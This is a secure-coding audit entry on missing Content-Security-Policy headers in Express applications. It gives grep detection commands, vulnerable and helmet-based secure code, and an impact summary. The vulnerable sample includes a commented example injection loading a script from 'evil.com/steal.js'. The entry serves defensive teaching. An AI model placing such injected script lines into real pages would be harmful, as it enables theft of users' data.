# OC-090: Missing Content-Security-Policy

**Category:** Web Application Security
**Severity:** MEDIUM
**Auditors:** WEB-02
**CWE:** CWE-1021
**OWASP:** A05:2021 - Security Misconfiguration

## Description

Content-Security-Policy (CSP) is an HTTP response header that instructs browsers which content sources are permitted to load on a page. Without CSP, the browser allows scripts, styles, images, and other resources from any origin, meaning a single XSS vulnerability can load and execute arbitrary external scripts with no restrictions.

According to a 2025 analysis by Scott Helme of the top one million websites, fewer than 12% deploy any Content-Security-Policy. This means the vast majority of production applications lack one of the most effective defense-in-depth mechanisms against XSS and data exfiltration.

The absence of CSP was a contributing factor in CVE-2025-25187 (Joplin), where an XSS vulnerability was escalated to remote code execution because there was no restrictive `script-src` directive to block inline script execution. A properly configured CSP would have prevented the exploit chain.

## Detection

```
# Check for CSP header in server configuration
grep -rn "Content-Security-Policy\|contentSecurityPolicy\|csp" --include="*.ts" --include="*.js"
grep -rn "helmet\|csp" --include="*.ts" --include="*.js"

# Check for CSP meta tag in HTML
grep -rn "http-equiv.*Content-Security-Policy" --include="*.html" --include="*.ejs" --include="*.hbs"

# Helmet.js usage (Express CSP middleware)
grep -rn "helmet()" --include="*.ts" --include="*.js"
```

## Vulnerable Code

```typescript
import express from 'express';

const app = express();

// VULNERABLE: No CSP headers set
app.get('/', (req, res) => {
  res.send(`
    <html>
      <head><title>My App</title></head>
      <body>
        <script src="/app.js"></script>
        <!-- If XSS is found, attacker can load any script: -->
        <!-- <script src="https://evil.com/steal.js"></script> -->
      </body>
    </html>
  `);
});

// Even if using a framework, no CSP means no second line of defense
app.use(express.static('public'));

app.listen(3000);
```

## Secure Code

```typescript
import express from 'express';
import helmet from 'helmet';
import crypto from 'crypto';

const app = express();

// SECURE: Generate nonce per request for strict CSP
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString('base64');
  next();
});

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: [
        "'self'",
        (req, res) => `'nonce-${res.locals.nonce}'`,
      ],
      styleSrc: ["'self'", "'unsafe-inline'"], // Inline styles harder to nonce
      imgSrc: ["'self'", 'data:', 'https://cdn.example.com'],
      connectSrc: ["'self'", 'https://api.example.com'],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameSrc: ["'none'"],
      baseUri: ["'self'"],
      formAction: ["'self'"],
      upgradeInsecureRequests: [],
    },
  }),
);

app.get('/', (req, res) => {
  res.send(`
    <html>
      <head><title>My App</title></head>
      <body>
        <script nonce="${res.locals.nonce}" src="/app.js"></script>
      </body>
    </html>
  `);
});

app.listen(3000);
```

## Impact

Without CSP, any XSS vulnerability has maximum impact: attackers can load external scripts, exfiltrate data to any domain via `fetch` or image beacons, inject crypto miners, overlay phishing pages, and execute arbitrary payloads with no browser-level restrictions. CSP is a critical defense-in-depth layer that limits the blast radius of XSS.

## References

- CVE-2025-25187: Joplin XSS escalated to RCE due to missing restrictive CSP
- Scott Helme: Security headers analysis of top 1M sites (2025) -- fewer than 12% deploy CSP
- CWE-1021: Improper Restriction of Rendered UI Layers or Frames
- OWASP CSP Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- MDN: Content-Security-Policy reference
